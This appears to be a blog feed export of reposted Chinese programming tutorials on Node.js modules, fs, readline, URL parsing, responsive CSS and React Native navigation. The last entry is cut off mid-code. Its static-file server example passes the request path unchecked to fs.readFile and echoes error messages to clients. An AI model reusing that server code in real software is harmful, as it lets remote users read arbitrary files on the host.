      <content type="text"><![CDATA[目录 模块创建以及使用 文件模块的使用 IO键盘交互 URL解析 一、模块创建以及使用什么是模块模块和文件是一 一对应的，一个模块就是一个js文件，Node.js提供了exports和require两个对象，其中exports是模块公共的接口，require用于从外部获取一个模块的接口，即获取模块的exports对象。想要在外部用自定义模块中的方法exports方法暴露出去，通过require引入模块再调用其方法。 模块的分类核心模块如http、fs、path等，引用《深入浅出Node.js》中的一段话核心模块部分在Node源代码的编译过程中，编译进了二进制执行文件。在Node进程启动时，部分核心模块就被直接加载进内存中，所以这部分核心模块引入时，文件定位和编译执行这两个步骤可以省略掉，并且在路径分析中优先判断，所以他的加载速度是最快的。 第三方模块通过NPM安装的模块都会放入到node_modules目录下，在引用模块时和核心模块类似，require方法只需写模块名一就可以，不需要路径。Node在查找这个模块时会现在本级目录下查看是否有node_modules目录，若有看其内是否有相应的模块，若没有会去父目录查找，以此类推，就像是JavaScript的原型链和作用域链的查找方式。所以这类模块的查找会耗时最多，加载最慢。 创建模块第一种方式//mymodule.js //使用exports向外部暴露方法 var name; exports.setName=function(isname) { name = isname; } exports.sayNanme=function (){ console.log(&apos;hello my name is &apos;+name); } //getmymodule.js var myModule =require(&apos;./mymodule&apos;); myModule.setName(&apos;AngelaMuller&apos;);//调用模块中方法设置属性 myModule.sayNanme();//调用方法 使用：muller@ubuntu:~/node$ node getmymodule.js hello my name is AngelaMuller 第二种方式//mymodule.js module.exports = function (name){ this.name = name; this.sayhello = function(){ console.log(&apos;hello world！&apos;+this.name); } }; //getmymodule.js var person = require(&apos;./mymodule&apos;); var oneper = new person(&apos;AngelaMuller&apos;); oneper.sayhello(); 使用：muller@ubuntu:~/node$ node getmymodule.js hello world！AngelaMuller 单次加载上面的例子有点类似创建一个对象，但实际上和对象又有本质的区别，因为require不会重复加载模块，也就是说无论调用多少次require，获取的模块都是同一个 覆盖exports有时我们知识想把一个对象封装到模块中，例如定义模块：singleobejct.js引入模块使用：getSingleObject.js繁琐：exports.hello=hello;引入：require(“./singleobject”).hello;简易：module.exports=hello;exports本身仅仅是一个普通的空对象，即{}，它是专门用来声明接口 定义模块：singleobejct.jsfunction hello(){ var name; this.setName=function(thyName){ name=thyName; } this.sayHello=function(){ console.log(&apos;hello &apos;+name); } } //exports.hello=hello; module.exports=hello; // 定义的方法添加 （简单的方式） 引入模块使用：getSingleObject.jsvar hello=require(&apos;./singleobject&apos;); var he=new hello(); he.setName(&apos;marico&apos;); //实例化第一个实例 he.sayHello(); var he2=new hello(); //实例化第二个实例 he2.setName(&apos;yfc&apos;); he2.sayHello() 结果输出：[root@localhost nodejs]# node getSingleObject.js hello marico hello yfc 繁琐：exports.hello=hello; //使用这种方式加载在对象中时，在调用使用时比较繁琐引入：require(“./singleobject”).hello; 二、文件操作node.js模块是文件操作的封装，它提供了文件的读取，写入，更名，删除，遍历目录，链接POSIX文件系统操作。与其他模块不同的是，fs模块中所有的操作都提供了异步和同步两个版本，例如，读取文件内容函数异步方法，readFile(),同步方法readFileSync().1.同步方式的文件系统调用会导致阻塞，由于Node.js是单线程的，直到文件调用完成后，控制权才会被放回主线程，这也就导致了后台其他线程池中的很多线程不能够执行，从而导致Node.js中一定程度的性能问题。因此应该尽可能的减少使用同步方式的文件系统的方法调用。2.异步调用会被主线程放置在事件队列中以备随后运行，这使得调用能够融入Node.js中的事件模型。但在执行代码时，就会变得有点棘手，因为事件并不能在预期的时候完成，这就需要有一个callback函数来规定当调用完成时需要完成的事。（这里可以去深入了解下Node.js的事件队列） 简单读取 fs.readFile(path,[options],callback); fs.readFildSync(path,[options]); 非简单读取 fs.read(fd,buffer,offset,length,position,callback); fs.readSync(fd,buffer,offset,length,position); 流式读取 fs.createReadStream(path,[options]); fs模块的其他方法 验证文件/目录路径的存在性 fs.exists(path,callback); fs.existsSync(path); 注： 同步方法返回true/false，异步方法callback仅仅只有一个err对象表示是否删除成功。 同步读取 //引入fs模块 var fs=require(&apos;fs&apos;); fs.readFile(&apos;content.txt&apos;,&apos;UTF-8&apos;,function(err,data){ if(err){ console.log(err); }else{ console.log(data); } }); //没有回调函数 try{ var data=fs.readFileSync(&apos;content.txt&apos;,&apos;UTF-8&apos;); console.log(data+&quot;同步式读取&quot;); }catch(e){ console.log(e) } content.txt 内容Node.js的文件系统的Api AngelaMuller输出结果： muller@ubuntu:~/node$ node mymodule.js Node.js的文件系统的Api AngelaMuller同步式读取 Node.js的文件系统的Api AngelaMuller 异步读取文件与readFile相同，而读取到的文件内容会以函数返回值的形式返回，如果有错误发生，fs将抛出异常，你需要try和catch捕获并处理异常。Node.js from fs.readFileSync() to fs.readFile()其他方法请查看官方APIhttps://nodejs.org/dist/latest-v4.x/docs/api/fs.html 三、 IO交互什么是IO交互简单点是Node.js的控制台输入输出，I 是input 可读输入流 ，O是output 可输出流，Node.js也有如同C++和Java的标准输入输出进行交互。 输入设备 输入设备是人向计算机输入信息的设备，常用的输入设备有： 键盘—人向计算机输入信息最基本的设备； 鼠标器—-一种光标指点设备； 触摸屏—-一种坐标定位设备，常用于公共查询系统。 输出设备 输出设备是直接向人提供计算机运行结果的设备，常用的输出设备有： 显示器—计算机的主要输出设备,它与键盘一起构成最基本的人机对话环境； 打印机—打印机为用户提供计算机信息的硬拷贝。常用的打印机有：击打式、喷墨式和激光打印机。 什么是ReadlineReadline是Node.js里实现标准输入输出的封装好的模块，通过这个模块我们可以以逐行的方式读取数据流。使用require(“readline”)可以引用模块。 如何使用Readline// 引入readline模块 const readline = require(&apos;readline&apos;); //创建readline接口实例 const rl = readline.createInterface({ input: process.stdin, //监听的可读流 (必填) output: process.stdout //逐行读取（Readline）数据要写入的可写流(可选) }); rl.setPrompt(&apos;What is your name ? &gt; &apos;);//设置提示符 rl.prompt(); //为用户输入准备好逐行读取（Readline）,让用户有新的地方输入 rl.on(&apos;line&apos;, function (str) { console.log(&apos;my name is : &apos;+str); }); // close事件监听 rl.on(&quot;close&quot;, function(){ // 结束程序 console.log(&apos;Have a great day!&apos;); process.exit(0);// 结束程序 }); /* v0.10.44 版本似乎有问题 v4.5.0案例 rl.on(&apos;line&apos;, (line) =&gt; { var str = line.trim(); console.log(&apos;my name is : &apos;+str); rl.prompt(); }).on(&apos;close&apos;, () =&gt; { console.log(&apos;Have a great day!&apos;); process.exit(0); }); */ 在close事件的监听里，我们执行了process.exit(0)来使程序退出的操作，因为readline模块只要一开始获取用户输入就不会结束，必须使用这种直接的方式来结束程序。 输入与输出实例// 引入readline模块 var readline = require(&apos;readline&apos;); var rl = readline.createInterface({ input: process.stdin, output: process.stdout }); rl.on(&apos;line&apos;, function(line){ switch(line.trim()) { case &apos;copy&apos;: console.log(&quot;复制&quot;); break; case &apos;hello&apos;: rl.write(&quot;Write&quot;); console.log(&apos;world!&apos;); break; case &apos;close&apos;: rl.close(); break; default: console.log(&apos;没有找到命令！&apos;); break; } }); rl.on(&apos;close&apos;, function() { console.log(&apos;bye bye&apos;); process.exit(0); }); &apos;line&apos;事件，这个事件就是在用户输完一行，按下回车后就会触发的事件，它会将用户输入的数据通过回调函数传回来，可在此方法里处理用户输入的数据 命令行输入与输出const readline = require(&apos;readline&apos;); const rl = readline.createInterface(process.stdin, process.stdout); rl.setPrompt(&apos;OHAI&gt; &apos;); rl.prompt(); rl.on(&apos;line&apos;, (line) =&gt; { switch(line.trim()) { case &apos;hello&apos;: console.log(&apos;world!&apos;); break; default: console.log(&apos;Say what? I might have heard `&apos; + line.trim() + &apos;`&apos;); break; } rl.prompt(); }).on(&apos;close&apos;, () =&gt; { console.log(&apos;Have a great day!&apos;); process.exit(0); }); 四、URL解析1.URL模块为URL的解析工具var url = require(&apos;url&apos;); var urlString = &apos;http://user:pass@best.bluepay.asia:90/p/a/t/h?query=string#hash&apos;; var result = url.parse(urlString); console.log(result); //第二个可选参数设置为true时 query: { query: &apos;string&apos; }, 输出结果： muller@ubuntu:~/node$ node url.js Url { protocol: &apos;http:&apos;, slashes: true, auth: &apos;user:pass&apos;, host: &apos;best.bluepay.asia:90&apos;, port: &apos;90&apos;, hostname: &apos;best.bluepay.asia&apos;, hash: &apos;#hash&apos;, search: &apos;?query=string&apos;, query: &apos;query=string&apos;, pathname: &apos;/p/a/t/h&apos;, path: &apos;/p/a/t/h?query=string&apos;, href: &apos;http://user:pass@best.bluepay.asia:90/p/a/t/h?query=string#hash&apos; } href 属性会被忽略 protocol无论是否有末尾的 : (冒号)，会同样的处理 这些协议包括 http, https, ftp, gopher, file 后缀是 :// (冒号-斜杠-斜杠). 所有其他的协议如 mailto, xmpp, aim, sftp, foo, 等 会加上后缀 : (冒号) auth 如果有将会出现. hostname 如果 host 属性没被定义，则会使用此属性. port 如果 host 属性没被定义，则会使用此属性. host 优先使用，将会替代 hostname 和port pathname 将会同样处理无论结尾是否有/ (斜杠) search 将会替代 query属性 query (object类型; 详细请看 querystring) 如果没有 search,将会使用此属性. search 无论前面是否有 ? (问号)，都会同样的处理 hash无论前面是否有# (井号, 锚点)，都会同样处理 2.queryString 模块提供了实用程序来处理查询字符串 querystring.stringify(obj, [sep], [eq]) 将JSON对象格式化为查询字符串格式的字符串，默认的分隔符为：“&amp;”和“=”，具体可以看一下以下代码. 1234567891011querystring.stringify(&#123; foo: &apos;bar&apos;, baz: [&apos;qux&apos;, &apos;quux&apos;], corge: &apos;&apos; &#125;)// returns &apos;foo=bar&amp;baz=qux&amp;baz=quux&amp;corge=&apos;querystring.stringify(&#123;foo: &apos;bar&apos;, baz: &apos;qux&apos;&#125;, &apos;;&apos;, &apos;:&apos;)// returns &apos;foo:bar;baz:qux&apos;// Suppose gbkEncodeURIComponent function already exists,// it can encode string with `gbk` encodingquerystring.stringify(&#123; w: &apos;中文&apos;, foo: &apos;bar&apos; &#125;, null, null, &#123; encodeURIComponent: gbkEncodeURIComponent &#125;)// returns &apos;w=%D6%D0%CE%C4&amp;foo=bar&apos; querystring.parse(str, [sep], [eq], [options]) 根据“&amp;”和“=”将字符串进行分割，反序列化为JSON对象，而options包含的maxKeys默认设置为1000，如果将其设置为0则表示没这个限制. 12345678querystring.parse(&apos;foo=bar&amp;baz=qux&amp;baz=quux&amp;corge&apos;)// returns &#123; foo: &apos;bar&apos;, baz: [&apos;qux&apos;, &apos;quux&apos;], corge: &apos;&apos; &#125;// Suppose gbkDecodeURIComponent function already exists,// it can decode `gbk` encoding stringquerystring.parse(&apos;w=%D6%D0%CE%C4&amp;foo=bar&apos;, null, null, &#123; decodeURIComponent: gbkDecodeURIComponent &#125;)// returns &#123; w: &apos;中文&apos;, foo: &apos;bar&apos; &#125; querystring.escape，querystring.unescape 这两个内置方法，分别在上述两个方法的内置使用，如果有需要分别格式化和解码URL字符串。 3. QueryString模块和Url模块之间的关系url.parse(string).query | url.parse(string).pathname | | | | | ------ ------------------- http://localhost:8888/start?foo=bar&amp;hello=world --- ----- | | | | querystring(string)[&quot;foo&quot;] | | querystring(string)[&quot;hello&quot;] 4. 获取静态资源完整实例（根据不同的url地址请求不同的文件） const ip = &apos;192.168.1.223&apos;;//主机IP const port = 3000;//端口号 //引入的组建模块 http、url、fs const http = require(&apos;http&apos;); const urls = require(&apos;url&apos;); const fs = require(&apos;fs&apos;); //实例化一个服务容器 var server = new http.Server(); //监听一个端口 server.listen(port , ip); //注册一个事件处理的on方法 server.on(&apos;request&apos; , function(req , res){ //获取请求的url地址 var url = urls.parse(req.url); //console.log(url.pathname); //根据path路径来读取不同的模板文件 switch( url.pathname ){ //显示首页 case &apos;&apos; || &apos;/&apos;: //读取文件内容 fs.readFile(&apos;./index.html&apos;,function( error, content){ if(error){ //如果有错误时，显示错误信息 funError(); }else{ //正确时浏览器输出模板文件的内容 funAuccess(res,content); } }); break; //显示列表页面 case &apos;/list&apos;: fs.readFile(&apos;./list.html&apos;,function( error, content){ if(error){ funError(res , error); }else{ funAuccess(res,content); } }); break; //显示详情页 case &apos;/show&apos;: fs.readFile(&apos;./show.html&apos;,function( error, content){ if(error){ funError(res , error); }else{ funAuccess(res,content); } }); break; //获取静态资源的页面 如：css\js default: //获取文件名 var filename = url.pathname.substring(1); //获取文件名对应的类型值 var type = getAllType( filename.substring(filename.lastIndexOf(&apos;.&apos;)+1)); //测试所用 //console.log(type); //读取静态资源的页面 fs.readFile(filename , function( error, content){ if(error){ funError(res , error); }else{ res.writeHead(200,{&apos;Content-Type&apos; : type}); res.write(content); res.end(); } }); break; } }); //错误提示的函数 function funError(response , error){ response.writeHead(400,{&apos;Content-Type&apos;:&apos;text/plain;charset=&quot;utf-8&quot;&apos;}); response.write(error.message); response.end(); } //正确时输出文件内容的函数 function funAuccess(response,cont){ response.writeHead(200,{&apos;Content-Type&apos;:&apos;text/html;charset=&quot;utf-8&quot;&apos;});//头信息 response.write(cont);//模板文件内容 response.end(); } //定义文件类型的函数 function getAllType(code){ var type = &apos;&apos;; switch(code){ case &apos;html&apos;: type = &apos;text/html;charset=utf-8&apos;; break; case &apos;js&apos;: type = &apos;application/javascript/html;charset=utf-8&apos;; break; case &apos;css&apos;: type = &apos;text/css;charset=utf-8&apos;; break; case &apos;text&apos;: type = &apos;text/plain;charset=utf-8&apos;; break; case &apos;manifest&apos;: type = &apos;text/cache-manifest;charset=utf-8&apos;; break; default: type = &apos;application/octet-stream&apos;; break; } return type; } 转自：http://www.jianshu.com/p/21c7db836836]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[谈响应式web设计代码实现🍨]]></title>
      <url>%2F2016%2F05%2F23%2F31%2F</url>
      <content type="text"><![CDATA[在研究响应式的时候，记录了一些感想，分享出来，抛砖引玉，希望可以和大家一起讨论。总结下来，响应式比之前想象的要复杂得多。1.ie9以下（不包括ie9）采用ie条件注释，为ie8以及一下单独开一个样式文件2.一个模块的mq样式整体放在这个模块的样式的之后，符合层叠逻辑，也同时以免被层叠。 祈求在一个相应点上同时做变化几乎是不可能的，因为版式中间的变化，无论是视觉还是具体的编码人员不可能掌握所有细节。 流体布局很关键，%视父级为参照物，这一点虽然很多人都知道，但是实际做的时候却最容易被忽略。 清除浮动也很重要，切记。 如果你希望边框、边距（内、外）也在100%的范围内，直接设置width:auto就好了，不要给予希望在新的css3属性上，也不要寄希望在-webkit上，-webkit-很容易就会变成下一个ie6了。 合理的嵌套更加健壮，用一个包装元素来替代设置当前元素margin或者padding。举例，假如有A和B两个元素，width是40%，maring-right是10%，这样很容易在搜索浏览器的时候篡位，所以用一个包装元素C去分别包裹A和B，然给给C设置50%，A和B分别设置为80%。这样就是合理且健壮的嵌套了。 两行两列这种设计，由于流体布局和字数的不同，所以为每一行添加一个包装元素，更加健壮。也就是说，先做两行，再在每一行里做两列。 不要奢望在在每一个像素的宽度上不会出现超出预期的表现，因为没有任何人知道页面在每一个像素宽度时候的表现的样子，页面越负责可预期的就越不准确。所以mq可能真的是“非预期数值”（预期数值指代在设计和实现之前约定的响应点） 相同区间的mq和mq会层叠，全局的样式也会和mq中的样式层叠，所以属性尽量不要写成缩写。以减少忘记的风险。 图片的自适应处理不容易，特别是有边框的，如果正常条件（没有利用mq来约束）下设置了宽和高，在另外一个mq下，仅仅设置一个属性是不行的，还是那句话，mq不是二选一（除非是两个不同的mq区间），而是层叠！！ 如果水平列表的两端的元素两端对齐，以四个元素为例，那么除了前三个预留左边距，最后一个为零；或者第一个右边据为0；后三个有右边距以外。可以采用第一个左侧有，最后一个右侧有，中间两个左右偏移边距来做，短的一面为 边距除以空白数，比如4个列表项，边距为40,则40除以3。好处么？就是可以保证每一个外包装为通栏的25%。 四个25%，两个50% 没关系，但是50% 25% 25%就可能会掉下去最后一个，所以24.99，22.49有时还会相差1~2像素。 如果版式变化不大，那么从大到小的写mq，不必写一个区间，只写最大值即可，这样一层一层的继承，小尺寸继承大尺寸，另外，不用过分担心选择器本身权重的问题，mq会提高其优先级。 像导航和版权这种在pc、pad、phone截然不同的版式。mq，就写区间。这样在区间外就等于这些dom毫无样式，这样就不比担心由继承引发的覆盖、优先级、重写以及未知问题。减少了属性的重写，提高了效率、降低了修改成本。其实就是等于一个dom，为不同的设备写不同的样式，这些样式之间不继承。 如果你希望几个元素是相对位置不变的话，请将他们包裹，通过这个包裹元素使他们整体与其他元素或元素组做排版，所以一个健壮的响应式离不开这些看似“冗余”的包裹元素。但还是以最少的可实现目标的dom层级为目标。 关于背景图，以中心为原点进行“裁剪”是理智的，已某一侧为原点看起来都有点怪。另外可以使用background-size某个值为auto，另外一个使用% 大图片请写在一个mq区间内，不要只写最大值，这样会搞定按需加载的问题。 banner样式实践 @media (min-width:1110px){.banner{height:684px; background:url(img/banner1980.jpg) center center no-repeat; background-size:auto 100%;}}/高度一直填充，两侧裁剪，这种体验先看比较好//以下不同目标分辨率载入不同的图片，保证k数最佳，裁剪体验应该一致/@media (min-width:769px) and (max-width:1110px){.banner{height:383px; background:url(img/banner1110.jpg) center center;}}@media (min-width:569px) and (max-width:768px){.banner{height:265px; background:url(img/banner768.jpg) center center;}}@media (min-width:415px) and (max-width:568px){.banner{height:196px; background:url(img/banner568.jpg) center center;}}@media (min-width:321px) and (max-width:414px){.banner{height:143px; background:url(img/banner414.jpg) center center;}}@media (max-width:320px){.banner{height:111px; background:url(img/banner320.jpg) center center;}}20.logo如果是在banner的背景图上镂空，这样是不推荐的。在缩小浏览器窗口宽度的时候，给人以很明显很明显的视觉差，感觉页面极其不健壮（至少我的感觉是这样），似乎有随时要散的感觉。文字也有这感觉，特别是有大量文字的时候。所以你会发现很多响应式好的网站，他的导航的底色都是纯色。logo和导航都不镂空在一张背景图上。当然也有少数在的，比如adobe。 接20，一般banner图片几乎是满屏的可能高达1980px；而一般如果是居中的话，我们把导航和logo以及一些小功能，比如登录、搜索控制在1200px最大宽度，当页面大于这个最大宽度的时候，这个区域就像钉在了背景图上，不会导致有两个图层的感觉。所以当页面宽度马上等于最大宽度的时候，我们在利用mq重新写定义下一这个区域的最大宽度，当然是该小一点，这样就解决了20出现的那个问题。 png8的问题，ie6下就用纯色做底吧。我最理想的想法是，当用ie6访问所有公司web产品的时候，给用户一个页面，先登录QQ帐号，然后下载最新的QQ浏览器，然后发这个用户10个Q币。然后浏览器界就清静了。 接21，当前mq中的这个区域的最大宽度等于下一个（更小的一个尺寸）mq的尺寸，这样就用户的钉在了背景图的上面了。 对于相同的一些元素，某一个有特殊的样式，优先使用nth-of-type选择器。在测试ie8以及一下的时候，再为这个特殊的dom添加一个class之类，然后再在那个ie8以及一下的样式表中书写复制响应的规则。 body下有一个包裹元素，作为整体弹性的参照，为ie6、ie7单独写一个宽度，为什么是1000px，由于很难获得使用ie6的用户的分辨率，或者说获取了之后可能因为数据繁多不好决策，所以简单粗暴，认为使用ie6的都是低端设备用户，是小显示器用户，是1024*768分辨率；至于ie7，设置了4个25%的浮动，在缩小浏览器的过程中都能时不时的掉下去一个，对于小数点的像素就自动向上补全，太悲哀了。所以如下： 1234regular css file.layout&#123;width:100%; max-width:1980px; min-width:320px;*zoom:1; margin:0 auto;&#125;lt9 css file.layout&#123;*width:1000px; min-width:1000px;&#125;/*ie8的最小宽度为1000px，ie7 6只有1000px*/ 26.对于一定要百分之百通栏的模块，比如，带有背景色的版权，或者banner，那么可以在lt9的文件夹里为ie7 6写一个不是只有1000px，而是可以100%的样式，但是切记这里只要有一列，否则就又产生了25中提到的问题，也许，你可以这么写： lt9 css file .layout{*width:1000px; min-width:1000px;}/*ie8的最小宽度为1000px，ie7 6只有1000px*/ .one-percent{width:100%;}/*新增的，一定要在layout的后面，否则对于ie6 7不生效*/ html dom 所以我建议，把banner 主体部分 版权 三者用三个layout包裹，这样便于对ie6 ie7 ie8做样式。 经过长达半年的持续统计，1366px用户最多，根据栅格化，n=24为基准，得出W=(A*n)-i，所以如果要设置最大宽度则设置为1310px；a=45px,i=10px；不过由于与门户和电商等网站的排版不同且主要为了弹性版式，所以这里最大宽度是我们所需要的，至于45px和10px，以后有固定版式的话可以使用。 响应点：1366px 1200px 1110px 768px 568px 414px 320px；768以下的很好理解也方便约束，PC侧的响应点是较难控制的，所以前面三个值基本都是按照版式来操作的。原因参见3。 有的人说写响应式从小往大写，意思是说先写手机端，然后写PC端，大致的原因是从大往小写的话，手机就要层叠和重写很多样式，可能会影响性能。理论上，我是赞成的，实际上我并没有测试过到底性能有多么影响。但是单单从布局的角度上讲，从设计的角度上讲，至少我的逻辑是从大往小写，因为小的基本都是在大的基础上做删减和布局的变化，所以写的时候逻辑比较顺畅。不过无论从大到小，还是从小到大，自己顺手就好。一般视觉都会先设计PC的，然后考虑mobile是什么样的，这一点也使得我是从大到小的去写。 之前黄老师问我，认为响应式的难点是在设计上还是在技术上，我当时说是技术上没什么，关键是版式的变化和设计的体验。现在想想。版式变化固然是难点，但是技术手段也很重要，在这方面的深度和方式的选择要比版式上的选择复杂的多。 响应式三大技术：流体、mq、弹性图片。 以上都是个人经验，难免片面，欢迎讨论。转自：http://isux.tencent.com/code-of-response-web-design.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[React-Native项目中使用TabBar 🍰]]></title>
      <url>%2F2016%2F05%2F19%2F30%2F</url>
      <content type="text"><![CDATA[之前的文章讲述了在RN项目中如何使用NavigationBar，如何调用原生模块，以及集成下拉刷新和上拉加载更多的功能，今天介绍一个第三方插件react-native-tab-navigator，讲述我是如何使用它在RN项目中使用TabBar项目源码在这里 1.安装插件npm install react-native-tab-navigator --save 2.使用就我的demo来说：Demo中包含了Navigator管理的一系列视图，我尝试过使用一个Tab管理多个由Navigator管理的一系列视图(这跟我之前的iOS开发经验有关，在iOS中Application的根视图是TabBarController，这个TabBarController管理多个由NavigationController管理的一系列ViewController） 但是这有一个问题：场景切换的时候可能有隐藏TabBar的需求，按照刚才说的方法，我需要set一个值来控制tabbar的height和overflow，又由于component的生命周期函数中没有类似于iOS中-（void)viewWillAppear;的方法，所以没有很好的方法把隐藏的tabbar再显示出来（如果你有解决这个问题的方法，请告诉我）。 那么换一种思路：把管理一系列视图的Tab交由一个Navigator管理，虽然这样违背了iOS开发的普通思路，但是就目前在RN项目中，没有发现太大的问题（有一个问题是只有一级页面显示TabBar，所有二级页面全部不显示，不过就国内大多数应用设计风格来看，这个问题也不算是问题）。 3.react-native-vector-icons这是一个图标库，有兴趣话可以去这里深入了解，简单使用请执行下边两条命令即可 $ npm install react-native-vector-icons --save $ rnpm link 使用： import Icon from &apos;react-native-vector-icons/Ionicons&apos;; &lt;Icon name={ &apos;ios-home&apos; } 4.关键部分代码//root.js import React from &apos;react&apos; import { Navigator } from &apos;react-native&apos;; import { Provider } from &apos;react-redux&apos; import configureStore from &apos;./store/store.js&apos; import App from &apos;./containers/app.js&apos; const store = configureStore(); class Root extends React.Component { render() { return ( &lt;Provider store={ store }&gt; //在原来&lt;App /&gt;的基础上添加Navigator &lt;Navigator initialRoute={{ component: App }} configureScene={(route) =&gt; { return Navigator.SceneConfigs.FloatFromRight; }} renderScene={(route, navigator) =&gt; { let Component = route.component; return &lt;Component {...route.params} navigator={navigator} /&gt; }} /&gt; &lt;/Provider&gt; ); } } export default Root; //---------------------- //app.js ( render(){} ) render() { const { reducer } = this.props; console.log(&quot;============&quot;,reducer.tabbarHeight); return ( &lt;TabNavigator tabBarStyle={{ backgroundColor:'white' }} style={{backgroundColor: 'white'}}&gt; &lt;TabNavigator.Item title=&quot;主页&quot; selected={this.state.selectedTab === &apos;home&apos;} renderIcon={() =&gt; &lt;Icon name={ &apos;ios-home&apos; } size={30} color={&apos;gray&apos;}/&gt;} renderSelectedIcon={() =&gt; &lt;Icon name={ &apos;ios-home&apos; } size={30} color={&apos;#4E78E7&apos;}/&gt;} onPress={() =&gt; this.setState({ selectedTab: &apos;home&apos; })}&gt; &lt;ProductListContainer {...this.props} /&gt; &lt;/TabNavigator.Item&gt; &lt;TabNavigator.Item title=&quot;其他&quot; selected={this.state.selectedTab === &apos;other&apos;} renderIcon={() =&gt; &lt;Icon name={ &apos;ios-more&apos; } size={30} color={&apos;gray&apos;}/&gt;} renderSelectedIcon={() =&gt; &lt;Icon name={ &apos;ios-more&apos; } size={30} color={&apos;#4E78E7&apos;}/&gt;} onPress={() =&gt; this.setState({ selectedTab: &apos;other&apos; })}&gt; &lt;OtherContainer {...this.props}/&gt; &lt;/TabNavigator.Item&gt; &lt;/TabNavigator&gt; ); } 5.效果图转自：http://www.jianshu.com/p/7a4899bde137]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[React Native 的 Navigator 组件使用方法]]></title>
      <url>%2F2016%2F05%2F15%2F29%2F</url>
      <content type="text"><![CDATA[React Native的编程思想类似于iOS, 导航栏也使用Navigator作为标识, 类似于Android的ActionBar. 导航栏作为最重要的应用组件之一, 除了处理页面导航功能以外, 还会提供页面栈的管理, 管理页面的跳入和跳出. 本文介绍 Navigator 组件的使用方式.React Native本文源码的GitHub下载地址关于React Native项目的启动, 参考1, 参考2. 简单使用Navigator添加 Navigator 的组件&lt;Navigator/&gt;. 设置方法: 初始化路由(initialRoute), 配置场景动画(configureScene), 渲染场景(renderScene). 初始化路由(initialRoute), 使用FirstPage页面作为首页. // 主模块 class SimpleView extends Component { // ... render() { return ( &lt;Navigator style={{flex:1}} initialRoute={{component: FirstPage}} configureScene={this.configureScene} renderScene={this.renderScene}/&gt; ); } } 配置场景动画(configureScene): 根据路由的type属性, 判断使用的动画样式, 底部弹出或右侧弹出. /** * 配置场景动画 * @param route 路由 * @param routeStack 路由栈 * @returns {*} 动画 */ configureScene(route, routeStack) { if (route.type == &apos;Bottom&apos;) { return Navigator.SceneConfigs.FloatFromBottom; // 底部弹出 } return Navigator.SceneConfigs.PushFromRight; // 右侧弹出 } 渲染场景(renderScene): 使用动态加载组件的方式. 设置加载页面的navigator参数, 其余使用route.passProps属性传递其他参数. /** * 使用动态页面加载 * @param route 路由 * @param navigator 导航器 * @returns {XML} 页面 */ renderScene(route, navigator) { return &lt;route.component navigator={navigator} {...route.passProps} /&gt;; } 也可以使用静态加载组件, 需要预定义组件, 没有动态加载灵活. /** * 渲染场景, 通过不同参数, 设置不同页面 * @param route 路由, 场景信息 * @param navigator 导航器 * @returns {XML} 页面 */ renderScene(route, navigator) { if (route.name == &apos;FirstPage&apos;) { return &lt;FirstPage navigator={navigator} {...route.passProps}/&gt; } else if (route.name == &apos;SecondPage&apos;) { return &lt;SecondPage navigator={navigator} {...route.passProps}/&gt; } } 第一页FirstPage组件: 包含导航栏标题和两个跳转按钮. 提供两种跳转动画, 右出和底部. 点击按钮调用_navigate()方法, 跳转到第二页. // 第一页. 使用Component可以自动生成注释, 符合标准 class FirstPage extends Component { // ... render() { return ( &lt;View style={styles.container}&gt; &lt;View style={styles.heading}&gt; &lt;Text style={styles.headText}&gt; {&apos;第一页&apos;} &lt;/Text&gt; &lt;/View&gt; &lt;TouchableOpacity style={styles.button} onPress={()=&gt;this._navigate(&apos;你好! (来源第一页:右出)&apos;)}&gt; &lt;Text style={styles.buttonText}&gt; {&apos;跳转至第二页(右出)&apos;} &lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;TouchableOpacity style={styles.button} onPress={()=&gt;this._navigate(&apos;你好! (来源第一页:底出)&apos;, &apos;Bottom&apos;)}&gt; &lt;Text style={styles.buttonText}&gt; {&apos;跳转至第二页(底部)&apos;} &lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;/View&gt; ); } } 也可以使用var FirstPage = React.createClass()创建组件, 但没有使用继承Component方式规范, 不能自动生成注释.第一页_navigate()方法: 导航跳转, 调用navigator.push()方法. 传递参数passProps的name属性, type动画类型, component跳转组件. /** * 给Navigator传递参数. * @param name 参数 * @private */ _navigate(name, type = &apos;Normal&apos;) { this.props.navigator.push({ component: SecondPage, passProps: { name: name }, type: type }) } 下划线表示私有方法, 类似Java的private限定符. 第二页SecondPage组件: 第二页, 跳出返回第一页. 调用navigator.pop()方法, 使用当前页面出栈, 显示上一个栈内页面. // 第二页, 点击跳出返回第一页 class SecondPage extends Component { render() { return ( &lt;View style={styles.container}&gt; &lt;View style={styles.heading}&gt; &lt;Text style={styles.headText}&gt; 第二页: {this.props.name} &lt;/Text&gt; &lt;/View&gt; &lt;TouchableOpacity style={styles.button} onPress={()=&gt;this.props.navigator.pop()}&gt; &lt;Text style={styles.buttonText}&gt; 返回上一页 &lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;/View&gt; ); } } Navigator的主要功能, 是管理页面栈, 控制页面的跳入跳出. 统一导航栏对于应用而言, 需要统一的导航栏, Navigator 组件也提供导航栏的定制. Navigator与上文类似, 额外添加navigationBar的属性, 自定义设置导航栏, 保持所有页面的导航栏一致. 属性添加&lt;NavigationBar/&gt;标签, 通过routeMapper控制导航栏的功能和样式. // 主模块 class UniformView extends Component { //... render() { return ( &lt;Navigator style={{flex:1}} initialRoute={{name: 'FirstPage', component: FirstPage}} configureScene={this.configureScene} renderScene={this.renderScene} navigationBar={ &lt;Navigator.NavigationBar style={styles.navContainer} routeMapper={NavigationBarRouteMapper}/&gt;} /&gt; ); } } NavigationBarRouteMapperNavigationBarRouteMapper: 导航栏路由映射器, 设置左键LeftButton, 右键RightButton, 标题Title. // 导航栏的Mapper var NavigationBarRouteMapper = { // 左键 LeftButton(route, navigator, index, navState) { // ... }, // 右键 RightButton(route, navigator, index, navState) { // ... }, // 标题 Title(route, navigator, index, navState) { return ( &lt;View style={styles.navContainer}&gt; &lt;Text style={styles.title}&gt; 应用标题 &lt;/Text&gt; &lt;/View&gt; ); } }; 左键LeftButton: index属性表示当前页面的索引, 通过判断index属性, 获知栈内是否有其他页面, 判断后退按钮是否显示. 点击调用navigator.pop()出栈. // 左键 LeftButton(route, navigator, index, navState) { if (index &gt; 0) { return ( &lt;View style={styles.navContainer}&gt; &lt;TouchableOpacity underlayColor=&apos;transparent&apos; onPress={() 